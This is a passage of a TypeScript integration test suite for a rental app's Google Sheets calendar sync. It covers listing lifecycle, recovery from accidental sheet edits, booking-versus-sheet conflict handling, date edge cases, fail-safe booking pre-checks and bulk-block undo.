            (c) => Number(c.listingId) === 801 && c.date === targetIsoDate,
        );
        assert.ok(lockedCal, "Day 15 must be imported as blocked in DB");
        assert.equal(lockedCal.isBlockedByHost, true);
        assert.equal(lockedCal.isAvailable, false);
        assert.equal(lockedCal.lockSource, "sheet_manual");

        // Run "Khởi tạo lịch chuẩn" TWICE -> MUST NOT wipe Day 15 Red block!
        const init1 = await request(app).post("/api/host/sheet-sync/init-calendar").set(hostAAuth);
        const init2 = await request(app).post("/api/host/sheet-sync/init-calendar").set(hostAAuth);
        assert.equal(init1.status, 200);
        assert.equal(init2.status, 200);

        const lockedCalAfter = calendarStore.find(
            (c) => Number(c.listingId) === 801 && c.date === targetIsoDate,
        );
        assert.equal(lockedCalAfter.isBlockedByHost, true);
        assert.equal(lockedCalAfter.isAvailable, false);

        const rowAfter = monthTab.rows.get(fakeSheets.findListingRowIndex(monthTab, 801))!;
        const day15Cell = rowAfter[2 + 14];
        assert.equal(
            rgbToHex(day15Cell.userEnteredFormat!.backgroundColorStyle!.rgbColor!),
            rgbToHex(SHEET_COLORS.HOST_BLOCKED_RED),
        );
    });

    it("SS-05: Listing lifecycle — auto-append new listing, rename Col B only, soft-delete guard (409), archive, restore same ID & admin transfer-host", async () => {
        await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });

        const rolling = hostSheetLayout.buildRollingMonthSpecs(
            new Date().toISOString().slice(0, 10),
            6,
        );
        const nextMonth = rolling[1];

        // 1. Add a 3rd listing (#803) & rename listing #801 -> sync updates Sheet automatically without init-calendar
        listingsStore[0].title = "Villa Bãi Sau 5PN VIP";
        makeRecord(listingsStore, "listingId", {
            listingId: 803,
            hostId: 101,
            title: "Penthouse View Biển",
            district: "TP Vũng Tàu",
            city: "Bà Rịa - Vũng Tàu",
            basePrice: 5200000,
            status: "active",
            deletedAt: null,
        });

        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);
        const tab = fakeSheets.findMonthTab(sheetIdA, nextMonth.tabKey)!;
        const idx801 = fakeSheets.findListingRowIndex(tab, 801);
        const idx803 = fakeSheets.findListingRowIndex(tab, 803);
        assert.ok(idx801 >= 2);
        assert.ok(idx803 > idx801, "New listing #803 must be appended below existing listings");
        assert.equal(tab.rows.get(idx801)![1].userEnteredValue?.stringValue, "Villa Bãi Sau 5PN VIP");

        // 2. Soft-delete listing #801 while it has a future confirmed booking -> MUST block with 409 Conflict!
        const checkIn = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 10);
        const checkOut = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 12);
        const futureBooking = makeRecord(bookingsStore, "bookingId", {
            bookingId: 9101,
            listingId: 801,
            guestUserId: 201,
            hostUserId: 101,
            checkInDate: checkIn,
            checkOutDate: checkOut,
            status: "confirmed",
            lockedUntil: null,
        });

        const blockedDelRes = await request(app)
            .delete("/api/host/listings/801")
            .set(hostAAuth);
        assert.equal(blockedDelRes.status, 409);

        // 3. Cancel future booking -> soft-delete succeeds -> marks [ĐÃ NGỪNG] on Sheet -> restore reuses listingId = 801
        futureBooking.status = "cancelled_by_guest";
        const okDelRes = await request(app)
            .delete("/api/host/listings/801")
            .set(hostAAuth);
        assert.equal(okDelRes.status, 200);
        assert.ok(listingsStore[0].deletedAt !== null);

        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);
        assert.equal(
            tab.rows.get(idx801)![1].userEnteredValue?.stringValue,
            "[ĐÃ NGỪNG] Villa Bãi Sau 5PN VIP",
        );

        const restoreRes = await request(app)
            .post("/api/host/listings/801/restore")
            .set(hostAAuth);
        assert.equal(restoreRes.status, 200);
        assert.equal(restoreRes.body.data.listingId, 801);
        assert.equal(listingsStore[0].deletedAt, null);

        // 4. Admin transfers listing #802 from Host A (101) to Host B (102) -> enqueues listing_transferred for both
        const sheetIdB = "1ZyXwVuTsRqPoNmLkJiHgFeDcBa9876543210HostB";
        fakeSheets.createBlankSpreadsheet(sheetIdB, "Lịch Villa - Host B");
        await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostBAuth)
            .send({ spreadsheetUrlOrId: sheetIdB });

        const transferRes = await request(app)
            .patch("/api/admin/listings/802/transfer-host")
            .set(adminAuth)
            .send({ newHostId: 102 });
        assert.equal(transferRes.status, 200);
        assert.equal(Number(listingsStore[1].hostId), 102);

        await new Promise((resolve) => setImmediate(resolve));
        assert.ok(
            jobsStore.some((j) => Number(j.hostUserId) === 101 && j.jobType === "listing_transferred"),
        );
        assert.ok(
            jobsStore.some((j) => Number(j.hostUserId) === 102 && j.jobType === "listing_transferred"),
        );
    });

    it("SS-06: Structural tampering — deleted row never opens dates, duplicate listing_id halts import, renamed & deleted month tabs recover", async () => {
        await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });

        const rolling = hostSheetLayout.buildRollingMonthSpecs(
            new Date().toISOString().slice(0, 10),
            6,
        );
        const nextMonth = rolling[1];
        const lockedDate = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 18);

        // Lock Day 18 in DB and sync so it's recorded on Sheet & Snapshot
        makeRecord(calendarStore, "calendarId", {
            listingId: 801,
            date: lockedDate,
            isAvailable: false,
            isBlockedByHost: true,
            isBlockedByAdmin: false,
            lockSource: "app_manual",
            syncRevision: 2,
        });
        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);

        // 1. Host accidentally deletes row for listing #801 in nextMonth tab
        const tab = fakeSheets.findMonthTab(sheetIdA, nextMonth.tabKey)!;
        const idx801 = fakeSheets.findListingRowIndex(tab, 801);
        tab.rows.delete(idx801);
        tab.rowDeveloperMetadata.delete(idx801);

        // Also rename the month tab to "Tháng Đổi Tên" -> DeveloperMetadata agy_month_tab still resolves it!
        tab.title = "Tháng Đổi Tên";

        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);

        // Day 18 MUST remain locked in DB and missing_listing_row must be recorded + row restored!
        const stillLocked = calendarStore.find(
            (c) => Number(c.listingId) === 801 && c.date === lockedDate,
        );
        assert.equal(stillLocked.isBlockedByHost, true);
        assert.equal(stillLocked.isAvailable, false);
        assert.ok(
            conflictsStore.some(
                (c) => c.conflictType === "missing_listing_row" && Number(c.listingId) === 801,
            ),
        );
        assert.ok(fakeSheets.findListingRowIndex(tab, 801) >= 2, "Deleted row must be restored from DB");

        // 2. Host duplicates listing #802 row (two rows with Col A = "802") and paints one Red on Day 20
        const idx802 = fakeSheets.findListingRowIndex(tab, 802);
        const clonedRow = JSON.parse(JSON.stringify(tab.rows.get(idx802)));
        clonedRow[2 + 19] = {
            userEnteredValue: { stringValue: "K" },
            userEnteredFormat: { backgroundColorStyle: { rgbColor: SHEET_COLORS.HOST_BLOCKED_RED } },
        };
        tab.rows.set(25, clonedRow);

        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);
        assert.ok(
            conflictsStore.some(
                (c) =>
                    c.conflictType === "duplicate_listing_row" &&
                    Number(c.listingId) === 802 &&
                    c.status === "open",
            ),
        );
        const dupDate = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 20);
        assert.equal(
            calendarStore.find((c) => Number(c.listingId) === 802 && c.date === dupDate),
            undefined,
            "Ambiguous duplicate rows must NOT import blocks into DB",
        );

        // 3. Host deletes an entire month tab -> automatically recreated on next sync!
        const doc = fakeSheets.spreadsheets.get(sheetIdA)!;
        const thirdMonthKey = rolling[2].tabKey;
        doc.tabs = doc.tabs.filter(
            (t) =>
                !t.developerMetadata.some(
                    (m) => m.metadataKey === "agy_month_tab" && m.metadataValue === thirdMonthKey,
                ),
        );
        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);
        assert.ok(
            fakeSheets.findMonthTab(sheetIdA, thirdMonthKey),
            "Deleted rolling month tab must be recreated automatically",
        );
    });

    it("SS-07 & SS-08: White cell NEVER unlocks bookings/admin/fresh App locks, concurrent edit fails-safe to locked, and effectiveFormat is ignored", async () => {
        await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });

        const rolling = hostSheetLayout.buildRollingMonthSpecs(
            new Date().toISOString().slice(0, 10),
            6,
        );
        const nextMonth = rolling[1];
        const dHold = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 5);
        const dHoldOut = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 6);
        const dPaid = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 7);
        const dPaidOut = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 8);
        const dAdmin = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 9);
        const dFreshApp = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 10);
        const dConcurrent = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 11);
        const dCondFmt = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 12);

        // Active pending_payment hold on Day 5
        makeRecord(bookingsStore, "bookingId", {
            bookingId: 9201,
            listingId: 801,
            guestUserId: 201,
            hostUserId: 101,
            checkInDate: dHold,
            checkOutDate: dHoldOut,
            status: "pending_payment",
            lockedUntil: new Date(Date.now() + 15 * 60_000),
        });

        // Confirmed booking on Day 7
        makeRecord(bookingsStore, "bookingId", {
            bookingId: 9202,
            listingId: 801,
            guestUserId: 201,
            hostUserId: 101,
            checkInDate: dPaid,
            checkOutDate: dPaidOut,
            status: "confirmed",
            lockedUntil: null,
        });

        // Admin lock on Day 9
        makeRecord(calendarStore, "calendarId", {
            listingId: 801,
            date: dAdmin,
            isAvailable: false,
            isBlockedByHost: false,
            isBlockedByAdmin: true,
            lockSource: "admin_lock",
            syncRevision: 1,
        });

        // Sync initial authoritative state to Sheet
        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);

        // Now simulate:
        // (a) Host wipes Day 5 (pending_hold) and Day 9 (admin_lock) to WHITE on Sheet
        fakeSheets.paintHostDay(sheetIdA, nextMonth.tabKey, 801, 5, {
            text: "",
            bgColor: SHEET_COLORS.WHITE,
        });
        fakeSheets.paintHostDay(sheetIdA, nextMonth.tabKey, 801, 9, {
            text: "",
            bgColor: SHEET_COLORS.WHITE,
        });
        // (b) Host paints RED over Day 7 (confirmed booking) -> must keep booking & log booking_vs_sheet_edit!
        fakeSheets.paintHostDay(sheetIdA, nextMonth.tabKey, 801, 7, {
            text: "Khách ngoài",
            bgColor: SHEET_COLORS.HOST_BLOCKED_RED,
        });
        // (c) Host locks Day 10 on App (fresh higher syncRevision = 5) while Sheet still shows old WHITE!
        makeRecord(calendarStore, "calendarId", {
            listingId: 801,
            date: dFreshApp,
            isAvailable: false,
            isBlockedByHost: true,
            isBlockedByAdmin: false,
            lockSource: "app_manual",
            syncRevision: 5,
        });
        // (d) Concurrent disagreement on Day 11: App changed revision (unlocked) while Sheet newly painted Red!
        makeRecord(calendarStore, "calendarId", {
            listingId: 801,
            date: dConcurrent,
            isAvailable: true,
            isBlockedByHost: false,
            isBlockedByAdmin: false,
            lockSource: null,
            syncRevision: 4,
        });
        fakeSheets.paintHostDay(sheetIdA, nextMonth.tabKey, 801, 11, {
            text: "K",
            bgColor: SHEET_COLORS.HOST_BLOCKED_RED,
        });
        // (e) Day 12 has conditional formatting RED in effectiveFormat, but userEnteredFormat is WHITE!
        fakeSheets.paintHostDay(sheetIdA, nextMonth.tabKey, 801, 12, {
            text: "",
            bgColor: SHEET_COLORS.WHITE,
            effectiveBgColor: { red: 1, green: 0, blue: 0 },
        });

        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);

        const tab = fakeSheets.findMonthTab(sheetIdA, nextMonth.tabKey)!;
        const row = tab.rows.get(fakeSheets.findListingRowIndex(tab, 801))!;

        // Verify (a): Day 5 restored to Orange G #9201; Day 9 remains Admin-locked Red
        assert.equal(row[2 + 4].userEnteredValue?.stringValue, "G #9201");
        const adminCal = calendarStore.find((c) => Number(c.listingId) === 801 && c.date === dAdmin);
        assert.equal(adminCal.isBlockedByAdmin, true);
        assert.equal(adminCal.isAvailable, false);

        // Verify (b): Day 7 restored to Green Đ #9202 & booking_vs_sheet_edit conflict logged
        assert.equal(row[2 + 6].userEnteredValue?.stringValue, "Đ #9202");
        assert.ok(
            conflictsStore.some(
                (c) => c.conflictType === "booking_vs_sheet_edit" && c.conflictDate === dPaid,
            ),
        );

        // Verify (c): Fresh App lock on Day 10 NOT overwritten by stale White Sheet cell; exported Red "K" to Sheet!
        const freshAppCal = calendarStore.find(
            (c) => Number(c.listingId) === 801 && c.date === dFreshApp,
        );
        assert.equal(freshAppCal.isBlockedByHost, true);
        assert.equal(freshAppCal.isAvailable, false);
        assert.equal(row[2 + 9].userEnteredValue?.stringValue, "K");

        // Verify (d): Concurrent edit on Day 11 fails safe to BLOCKED + logs app_vs_sheet_concurrent
        const concCal = calendarStore.find(
            (c) => Number(c.listingId) === 801 && c.date === dConcurrent,
        );
        assert.equal(concCal.isBlockedByHost, true);
        assert.equal(concCal.isAvailable, false);
        assert.ok(
            conflictsStore.some(
                (c) => c.conflictType === "app_vs_sheet_concurrent" && c.conflictDate === dConcurrent,
            ),
        );

        // Verify (e): Conditional formatting effectiveFormat on Day 12 is strictly ignored!
        assert.equal(
            calendarStore.find((c) => Number(c.listingId) === 801 && c.date === dCondFmt),
            undefined,
        );
        assert.ok(
            fakeSheets.recordedGetFields.every((f) => !f.includes("effectiveFormat")),
            "GET spreadsheet fields mask must never request effectiveFormat",
        );
        assert.ok(
            fakeSheets.recordedUpdateCellsFields.every((f) => f !== "*" && f.length > 0),
            "updateCells fields mask must never be wildcard '*'",
        );
        assert.equal(
            classifySheetCalendarCell({
                userEnteredValue: { stringValue: "" },
                userEnteredFormat: { backgroundColorStyle: { rgbColor: SHEET_COLORS.WHITE } },
                effectiveFormat: { backgroundColor: { red: 1, green: 0, blue: 0 } },
            }).state,
            "empty",
        );
    });

    it("SS-09: Calendar edge cases — leap year Feb 2028 vs Feb 2026, 30-day months, cross-year [checkIn, checkOut) & UTC+7 safety", () => {
        const feb2026 = hostSheetLayout.parseMonthTabKey("02-2026");
        const feb2028 = hostSheetLayout.parseMonthTabKey("02-2028");
        const nov2026 = hostSheetLayout.parseMonthTabKey("11-2026");

        assert.equal(feb2026.daysInMonth, 28);
        assert.equal(feb2028.daysInMonth, 29);
        assert.equal(nov2026.daysInMonth, 30);

        // Cross-year half-open [checkIn, checkOut) stay: 2026-12-30 -> 2027-01-02
        const reserved = bookingDateLockService.buildReservedDates("2026-12-30", "2027-01-02");
        assert.deepEqual(reserved, ["2026-12-30", "2026-12-31", "2027-01-01"]);

        // Timezone-shifted Date objects representing midnight UTC+7 (17:00 UTC previous day? Wait: ISO string slicing vs Date.UTC)
        const fromDates = bookingDateLockService.buildReservedDates(
            new Date("2026-11-01T00:00:00.000Z"),
            new Date("2026-11-03T00:00:00.000Z"),
        );
        assert.deepEqual(fromDates, ["2026-11-01", "2026-11-02"]);
    });

    it("SS-10: Live booking pre-check blocks just-painted Sheet day (409), fails-safe on Google 503 (503), clears expired hold & respects worker lease", async () => {
        await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA, strictBookingPrecheck: true });

        const rolling = hostSheetLayout.buildRollingMonthSpecs(
            new Date().toISOString().slice(0, 10),
            6,
        );
        const nextMonth = rolling[1];
        const checkIn = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 21);
        const checkOut = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 23);

        // 1. Host paints Day 21 Red on Sheet BEFORE polling worker runs; Guest clicks Book immediately -> 409!
        fakeSheets.paintHostDay(sheetIdA, nextMonth.tabKey, 801, 21, {
            text: "Khách Zalo",
            bgColor: SHEET_COLORS.HOST_BLOCKED_RED,
        });

        await assert.rejects(
            () =>
                hostSheetSyncService.verifySheetAvailabilityBeforeBooking({
                    listingId: 801,
                    hostUserId: 101,
                    checkInDate: checkIn,
                    checkOutDate: checkOut,
                }),
            (err: any) => err?.statusCode === 409,
        );

        // And the live pre-check immediately persisted the block in AvailabilityCalendar!
        const persistedBlock = calendarStore.find(
            (c) => Number(c.listingId) === 801 && c.date === checkIn,
        );
        assert.ok(persistedBlock);
        assert.equal(persistedBlock.isBlockedByHost, true);

        // 2. Google API throws 503 UPSTREAM_UNAVAILABLE during strict pre-check -> rejects with 503 instead of allowing double-booking!
        const checkIn2 = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 24);
        const checkOut2 = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 25);
        fakeSheets.nextGetError = new GoogleSheetsClientError(
            "UPSTREAM_UNAVAILABLE",
            "Google Sheets API 503",
            { httpStatus: 503, retryable: true },
        );

        await assert.rejects(
            () =>
                hostSheetSyncService.verifySheetAvailabilityBeforeBooking({
                    listingId: 801,
                    hostUserId: 101,
                    checkInDate: checkIn2,
                    checkOutDate: checkOut2,
                }),
            (err: any) => err?.statusCode === 503,
        );

        // 3. Expired pending_payment hold is cleared back to White on Sheet without re-importing as Host block
        const expDate = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 26);
        const expOut = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 27);
        const expBooking = makeRecord(bookingsStore, "bookingId", {
            bookingId: 9301,
            listingId: 801,
            guestUserId: 201,
            hostUserId: 101,
            checkInDate: expDate,
            checkOutDate: expOut,
            status: "pending_payment",
            lockedUntil: new Date(Date.now() + 10 * 60_000),
        });
        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);

        // Expire the booking
        expBooking.status = "payment_expired";
        expBooking.lockedUntil = new Date(Date.now() - 60_000);
        await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);

        const tab = fakeSheets.findMonthTab(sheetIdA, nextMonth.tabKey)!;
        const row = tab.rows.get(fakeSheets.findListingRowIndex(tab, 801))!;
        assert.equal(row[2 + 25].userEnteredValue?.stringValue ?? "", "");
        assert.equal(
            calendarStore.find((c) => Number(c.listingId) === 801 && c.date === expDate),
            undefined,
        );

        // 4. Multi-instance worker lease lock: active syncLockExpiresAt skips concurrent worker & requeues job cleanly
        integrationsStore[0].syncLockToken = "other-worker-token";
        integrationsStore[0].syncLockExpiresAt = new Date(Date.now() + 60_000);

        const job = await hostSheetSyncService.enqueueHostSheetSyncJob({
            hostUserId: 101,
            jobType: "manual_sync",
            forceEvenIfPaused: true,
        });
        const claimed = await hostSheetSyncWorker.claimNextPendingSheetSyncJob("worker-2");
        assert.equal(claimed.jobId, job.jobId);
        const outcome = await hostSheetSyncWorker.processClaimedSheetSyncJob(claimed);
        assert.equal(outcome.status, "requeued");
    });

    it("SS-11: Bulk whole-row block warning (>= 14 days) + 1-click Undo reverts safely while preserving newly booked dates", async () => {
        await request(app)
            .post("/api/host/sheet-sync/connect")
            .set(hostAAuth)
            .send({ spreadsheetUrlOrId: sheetUrlA });

        const rolling = hostSheetLayout.buildRollingMonthSpecs(
            new Date().toISOString().slice(0, 10),
            6,
        );
        const nextMonth = rolling[1];

        // Host accidentally paints 16 days (Days 1..16) Red across row #801
        for (let day = 1; day <= 16; day += 1) {
            fakeSheets.paintHostDay(sheetIdA, nextMonth.tabKey, 801, day, {
                text: "K",
                bgColor: SHEET_COLORS.HOST_BLOCKED_RED,
            });
        }

        const syncRes = await request(app).post("/api/host/sheet-sync/sync-now").set(hostAAuth);
        assert.equal(syncRes.status, 200);

        const bulkWarning = syncRes.body.data.openWarnings.find(
            (w: any) => w.conflictType === "bulk_row_block_warning" && w.canUndoBulkChange === true,
        );
        assert.ok(bulkWarning, "Expected bulk_row_block_warning with canUndoBulkChange = true");

        // Suppose Day 3 received an active booking in the meantime
        const day3 = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 3);
        const day4 = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 4);
        makeRecord(bookingsStore, "bookingId", {
            bookingId: 9401,
            listingId: 801,
            guestUserId: 201,
            hostUserId: 101,
            checkInDate: day3,
            checkOutDate: day4,
            status: "confirmed",
            lockedUntil: null,
        });

        // Host clicks 1-click Undo ("undo_bulk_change")
        const undoRes = await request(app)
            .post(`/api/host/sheet-sync/conflicts/${bulkWarning.conflictId}/resolve`)
            .set(hostAAuth)
            .send({ action: "undo_bulk_change" });
        assert.equal(undoRes.status, 200);

        // Unbooked days (e.g. Day 1, Day 10) are reverted to available
        const day1 = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 1);
        const day10 = hostSheetLayout.formatIsoDate(nextMonth.year, nextMonth.month, 10);
        assert.equal(
            calendarStore.find((c) => Number(c.listingId) === 801 && c.date === day1),
            undefined,
        );
        assert.equal(
            calendarStore.find((c) => Number(c.listingId) === 801 && c.date === day10),
            undefined,
        );

        // And booked Day 3 was NOT unlocked!
        const day3Cal = calendarStore.find((c) => Number(c.listingId) === 801 && c.date === day3);
        assert.ok(day3Cal);
        assert.equal(day3Cal.isBlockedByHost, true);
    });
});
